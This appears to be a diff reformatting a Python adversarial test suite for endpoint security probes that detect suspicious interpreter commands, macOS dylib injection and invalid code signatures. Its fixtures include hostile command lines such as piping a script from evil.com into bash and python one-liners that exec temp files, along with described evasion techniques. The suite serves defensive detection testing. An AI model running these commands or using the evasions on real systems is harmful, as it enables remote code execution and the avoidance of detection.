+            _BFT_EVA2,
+            _BFT_EVA3,
+            _BFT_BENIGN1,
+            _BFT_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -1623,6 +1756,7 @@ binary_from_temp_scenario = register(Scenario(
 #
 # Fires HIGH when an INTERPRETERS process has cmdline matching SUSPICIOUS_PATTERNS.
 # Returns 0 events if the interpreter runs with benign arguments.
+
 
 def _si_patches(name: str, cmdline: list) -> dict:
     return _pp([_mk_proc(_p(name=name, cmdline=cmdline))])
@@ -1645,10 +1779,14 @@ _SI_POS1 = AdversarialCase(
     expect_count=1,
     expect_event_types=["suspicious_script_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_si_patches("python3", [
-        "python3", "-c",
-        "import socket; s=socket.socket(); exec(open('/tmp/sh').read())",
-    ]),
+    patch_targets=_si_patches(
+        "python3",
+        [
+            "python3",
+            "-c",
+            "import socket; s=socket.socket(); exec(open('/tmp/sh').read())",
+        ],
+    ),
 )
 
 _SI_POS2 = AdversarialCase(
@@ -1660,16 +1798,20 @@ _SI_POS2 = AdversarialCase(
         "attacker-controlled server and pipes it directly to bash for execution."
     ),
     why=(
-        "bash ∈ INTERPRETERS. cmdline_str matches r'curl.*\\|\\s*(bash|sh)' "
-        "→ HIGH."
+        "bash ∈ INTERPRETERS. cmdline_str matches r'curl.*\\|\\s*(bash|sh)' " "→ HIGH."
     ),
     events=[],
     expect_count=1,
     expect_event_types=["suspicious_script_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_si_patches("bash", [
-        "bash", "-c", "curl http://evil.com/stager.sh | bash",
-    ]),
+    patch_targets=_si_patches(
+        "bash",
+        [
+            "bash",
+            "-c",
+            "curl http://evil.com/stager.sh | bash",
+        ],
+    ),
 )
 
 _SI_POS3 = AdversarialCase(
@@ -1688,9 +1830,14 @@ _SI_POS3 = AdversarialCase(
     expect_count=1,
     expect_event_types=["suspicious_script_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_si_patches("python3", [
-        "python3", "-c", "eval(compile(open('/tmp/p').read(),'f','exec'))",
-    ]),
+    patch_targets=_si_patches(
+        "python3",
+        [
+            "python3",
+            "-c",
+            "eval(compile(open('/tmp/p').read(),'f','exec'))",
+        ],
+    ),
 )
 
 _SI_EVA1 = AdversarialCase(
@@ -1709,9 +1856,14 @@ _SI_EVA1 = AdversarialCase(
     events=[],
     expect_count=0,
     expect_evades=True,
-    patch_targets=_si_patches("analyzer", [
-        "analyzer", "--connect", "evil.com:443",
-    ]),
+    patch_targets=_si_patches(
+        "analyzer",
+        [
+            "analyzer",
+            "--connect",
+            "evil.com:443",
+        ],
+    ),
 )
 
 _SI_EVA2 = AdversarialCase(
@@ -1730,9 +1882,13 @@ _SI_EVA2 = AdversarialCase(
     events=[],
     expect_count=0,
     expect_evades=True,
-    patch_targets=_si_patches("python3", [
-        "python3", "decrypt_and_run.pyc",
-    ]),
+    patch_targets=_si_patches(
+        "python3",
+        [
+            "python3",
+            "decrypt_and_run.pyc",
+        ],
+    ),
 )
 
 _SI_EVA3 = AdversarialCase(
@@ -1769,9 +1925,14 @@ _SI_BENIGN1 = AdversarialCase(
     ),
     events=[],
     expect_count=0,
-    patch_targets=_si_patches("bash", [
-        "bash", "/usr/local/bin/build.sh", "--release",
-    ]),
+    patch_targets=_si_patches(
+        "bash",
+        [
+            "bash",
+            "/usr/local/bin/build.sh",
+            "--release",
+        ],
+    ),
 )
 
 _SI_BENIGN2 = AdversarialCase(
@@ -1788,37 +1949,43 @@ _SI_BENIGN2 = AdversarialCase(
     ),
     events=[],
     expect_count=0,
-    patch_targets=_si_patches("osascript", [
-        "osascript", "-e",
-        'display notification "Build complete" with title "CI"',
-    ]),
+    patch_targets=_si_patches(
+        "osascript",
+        [
+            "osascript",
+            "-e",
+            'display notification "Build complete" with title "CI"',
+        ],
+    ),
 )
 
-script_interpreter_scenario = register(Scenario(
-    probe_id="script_interpreter",
-    agent="proc",
-    name="script_interpreter",
-    title="Suspicious Script Interpreter Execution — T1059",
-    description=(
-        "Tests ScriptInterpreterProbe's INTERPRETERS list + SUSPICIOUS_PATTERNS "
-        "regex matching. Evasions: custom binary names outside the interpreter "
-        "list, obfuscated payloads without pattern keywords, and split-stage "
-        "execution across separate processes."
-    ),
-    mitre_techniques=["T1059", "T1059.001", "T1059.003", "T1059.004", "T1059.006"],
-    mitre_tactics=["execution"],
-    probe_factory=ScriptInterpreterProbe,
-    cases=[
-        _SI_POS1,
-        _SI_POS2,
-        _SI_POS3,
-        _SI_EVA1,
-        _SI_EVA2,
-        _SI_EVA3,
-        _SI_BENIGN1,
-        _SI_BENIGN2,
-    ],
-))
+script_interpreter_scenario = register(
+    Scenario(
+        probe_id="script_interpreter",
+        agent="proc",
+        name="script_interpreter",
+        title="Suspicious Script Interpreter Execution — T1059",
+        description=(
+            "Tests ScriptInterpreterProbe's INTERPRETERS list + SUSPICIOUS_PATTERNS "
+            "regex matching. Evasions: custom binary names outside the interpreter "
+            "list, obfuscated payloads without pattern keywords, and split-stage "
+            "execution across separate processes."
+        ),
+        mitre_techniques=["T1059", "T1059.001", "T1059.003", "T1059.004", "T1059.006"],
+        mitre_tactics=["execution"],
+        probe_factory=ScriptInterpreterProbe,
+        cases=[
+            _SI_POS1,
+            _SI_POS2,
+            _SI_POS3,
+            _SI_EVA1,
+            _SI_EVA2,
+            _SI_EVA3,
+            _SI_BENIGN1,
+            _SI_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -1827,6 +1994,7 @@ script_interpreter_scenario = register(Scenario(
 #
 # macOS-only. Parses ps output for DYLD_INSERT_LIBRARIES env var.
 # Requires: PSUTIL_AVAILABLE=True, platform.system()="Darwin", subprocess.run mock.
+
 
 def _dylib_patches(subprocess_mock, platform_os: str = "Darwin") -> dict:
     return {
@@ -1891,10 +2059,13 @@ _DYLIB_POS3 = AdversarialCase(
     expect_count=1,
     expect_event_types=["dylib_injection_detected"],
     expect_severity=Severity.CRITICAL,
-    patch_targets=_dylib_patches(_dylib_ps_one(
-        pid=9999, proc_name="curl",
-        dylib="/var/folders/xx/a1b2c3/T/stage2.dylib",
-    )),
+    patch_targets=_dylib_patches(
+        _dylib_ps_one(
+            pid=9999,
+            proc_name="curl",
+            dylib="/var/folders/xx/a1b2c3/T/stage2.dylib",
+        )
+    ),
 )
 
 _DYLIB_EVA1 = AdversarialCase(
@@ -1990,30 +2161,32 @@ _DYLIB_BENIGN2 = AdversarialCase(
     patch_targets=_dylib_patches(_dylib_ps_framework()),
 )
 
-dylib_injection_scenario = register(Scenario(
-    probe_id="dylib_injection",
-    agent="proc",
-    name="dylib_injection",
-    title="Dylib Injection via DYLD_INSERT_LIBRARIES — T1547 / T1574.006",
-    description=(
-        "Tests DylibInjectionProbe's ps-based DYLD_INSERT_LIBRARIES detection. "
-        "Evasions: non-Darwin platform, ps failure, and using LC_LOAD_DYLIB "
-        "binary patching instead of env var injection."
-    ),
-    mitre_techniques=["T1547", "T1574.006"],
-    mitre_tactics=["persistence", "privilege_escalation"],
-    probe_factory=DylibInjectionProbe,
-    cases=[
-        _DYLIB_POS1,
-        _DYLIB_POS2,
-        _DYLIB_POS3,
-        _DYLIB_EVA1,
-        _DYLIB_EVA2,
-        _DYLIB_EVA3,
-        _DYLIB_BENIGN1,
-        _DYLIB_BENIGN2,
-    ],
-))
+dylib_injection_scenario = register(
+    Scenario(
+        probe_id="dylib_injection",
+        agent="proc",
+        name="dylib_injection",
+        title="Dylib Injection via DYLD_INSERT_LIBRARIES — T1547 / T1574.006",
+        description=(
+            "Tests DylibInjectionProbe's ps-based DYLD_INSERT_LIBRARIES detection. "
+            "Evasions: non-Darwin platform, ps failure, and using LC_LOAD_DYLIB "
+            "binary patching instead of env var injection."
+        ),
+        mitre_techniques=["T1547", "T1574.006"],
+        mitre_tactics=["persistence", "privilege_escalation"],
+        probe_factory=DylibInjectionProbe,
+        cases=[
+            _DYLIB_POS1,
+            _DYLIB_POS2,
+            _DYLIB_POS3,
+            _DYLIB_EVA1,
+            _DYLIB_EVA2,
+            _DYLIB_EVA3,
+            _DYLIB_BENIGN1,
+            _DYLIB_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -2022,6 +2195,7 @@ dylib_injection_scenario = register(Scenario(
 #
 # macOS-only. Runs codesign --verify --deep on CRITICAL_BINARIES.
 # Fires HIGH when returncode != 0 and the binary exists.
+
 
 def _cs_patches(
     subprocess_mock,
@@ -2087,9 +2261,7 @@ _CS_POS3 = AdversarialCase(
         "Attacker replaced sshd with a backdoored binary to intercept "
         "all SSH sessions. Invalid signature detected."
     ),
-    why=(
-        "os.path.exists('/usr/sbin/sshd')=True; codesign returns 1 → HIGH."
-    ),
+    why=("os.path.exists('/usr/sbin/sshd')=True; codesign returns 1 → HIGH."),
     events=[],
     expect_count=1,
     expect_event_types=["code_signature_invalid"],
@@ -2191,27 +2363,29 @@ _CS_BENIGN2 = AdversarialCase(
     patch_targets=_cs_patches(_codesign_ok(), target_path="/usr/bin/sudo"),
 )
 
-code_signing_scenario = register(Scenario(
-    probe_id="code_signing",
-    agent="proc",
-    name="code_signing",
-    title="Code Signature Verification — T1036 / T1070.005",
-    description=(
-        "Tests CodeSigningProbe's codesign --verify --deep checks on critical "
-        "macOS binaries. Evasions: non-Darwin platform, binary path manipulation, "
-        "codesign unavailable, and re-signing with own Developer ID certificate."
-    ),
-    mitre_techniques=["T1036", "T1070.005"],
-    mitre_tactics=["defense_evasion"],
-    probe_factory=CodeSigningProbe,
-    cases=[
-        _CS_POS1,
-        _CS_POS2,
-        _CS_POS3,
-        _CS_EVA1,
-        _CS_EVA2,
-        _CS_EVA3,
-        _CS_BENIGN1,
-        _CS_BENIGN2,
-    ],
-))
+code_signing_scenario = register(
+    Scenario(
+        probe_id="code_signing",
+        agent="proc",
+        name="code_signing",
+        title="Code Signature Verification — T1036 / T1070.005",
+        description=(
+            "Tests CodeSigningProbe's codesign --verify --deep checks on critical "
+            "macOS binaries. Evasions: non-Darwin platform, binary path manipulation, "
+            "codesign unavailable, and re-signing with own Developer ID certificate."
+        ),
+        mitre_techniques=["T1036", "T1070.005"],
+        mitre_tactics=["defense_evasion"],
+        probe_factory=CodeSigningProbe,
+        cases=[
+            _CS_POS1,
+            _CS_POS2,
+            _CS_POS3,
+            _CS_EVA1,
+            _CS_EVA2,
+            _CS_EVA3,
+            _CS_BENIGN1,
+            _CS_BENIGN2,
+        ],
+    )
+)
